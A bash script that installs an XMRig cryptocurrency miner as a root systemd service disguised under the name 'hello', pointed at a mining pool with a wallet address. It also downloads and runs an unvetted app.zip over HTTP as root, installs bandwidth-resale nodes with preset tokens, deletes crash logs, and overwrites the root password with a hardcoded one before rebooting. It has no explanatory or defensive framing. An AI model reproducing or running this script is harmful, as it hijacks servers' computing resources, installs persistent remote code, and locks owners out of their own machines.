#!/bin/bash
sudo su
cd /home
wget https://raw.githubusercontent.com/taikhoanxzc004/az/main/xmrig
chmod +x xmrig

rm -rf /lib/systemd/system/hello.service
rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/hello.service 
[Unit]
Description=hello
After=network.target
[Service]
ExecStart= /home/xmrig -o che-cop.com:8423 -u ZEPHsAJeJU3Su6K5KnAE4HLa8SKUtd2tpPJpdKAp3Y74EufH7Y4TXeJHDya93kfkRqcAgGgM3X82x8zP6c42keLS2KXoxDjqize -p HUYOPA -a rx/0 -k --cpu-no-yield --cpu-priority=2
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable hello.service &&
service hello stop  &&
service hello restart


mkdir /home/app && cd /home/app && wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb && sudo dpkg -i packages-microsoft-prod.deb && rm packages-microsoft-prod.deb && sudo apt-get update && sudo apt-get install -y aspnetcore-runtime-6.0 unzip && curl -sS http://hnv-data.online/app.zip > app.zip && unzip app.zip

cat > /etc/systemd/system/app.service <<EOL
[Unit]
Description=Example .NET Web API App running on Ubuntu

[Service]
WorkingDirectory=/home/app
ExecStart=/usr/bin/dotnet /home/app/HNV.DistributeFile.Client.dll
Restart=always
# Restart service after 10 seconds if the dotnet service crashes: 
RestartSec=10
KillSignal=SIGINT
SyslogIdentifier=dotnet-example
User=root
Environment=ASPNETCORE_ENVIRONMENT=Production
Environment=DOTNET_PRINT_TELEMETRY_MESSAGE=false

[Install]
WantedBy=multi-user.target
EOL
sudo systemctl daemon-reload && sudo systemctl enable app.service && sudo systemctl start app.service

cd /root && curl -o gaganode-linux-amd64.tar.gz https://assets.coreservice.io/public/package/66/gaganode_pro/0.0.200/gaganode_pro-0_0_200.tar.gz && tar -zxf gaganode-linux-amd64.tar.gz && rm -f gaganode-linux-amd64.tar.gz && cd gaganode-linux-amd64 && rm -rf ./root_conf/default.toml && cd root_conf && wget https://raw.githubusercontent.com/taikhoanxzc004/gaga/main/default.toml
cat > /etc/systemd/system/gaganode.service <<EOL
[Unit]
Description=Example .NET Web API App running on Ubuntu

[Service]
WorkingDirectory=/root/gaganode-linux-amd64
ExecStart=/root/gaganode-linux-amd64/gaganode
Restart=always
RestartSec=10
KillSignal=SIGINT
User=root

[Install]
WantedBy=multi-user.target
EOL
sudo systemctl daemon-reload && sudo systemctl enable gaganode.service && sudo systemctl start gaganode.service

cd /root && wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.19/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn && sudo ./meson_cdn config set --token=fdmbxmtufonkjjpqb60855facf68464d --https_port=443 --cache.size=20 && sudo ./service start meson_cdn
cat > /etc/systemd/system/meson.service <<EOL
[Unit]
Description=Example .NET Web API App running on Ubuntu

[Service]
WorkingDirectory=/root/meson_cdn-linux-amd64
ExecStart=/root/meson_cdn-linux-amd64/meson_cdn
Restart=always
RestartSec=10
KillSignal=SIGINT
User=root

[Install]
WantedBy=multi-user.target
EOL
sudo systemctl daemon-reload && sudo systemctl enable meson.service && sudo systemctl start meson.service && echo 'root:Ytb1452@!@#$%Aa' | chpasswd && sudo reboot

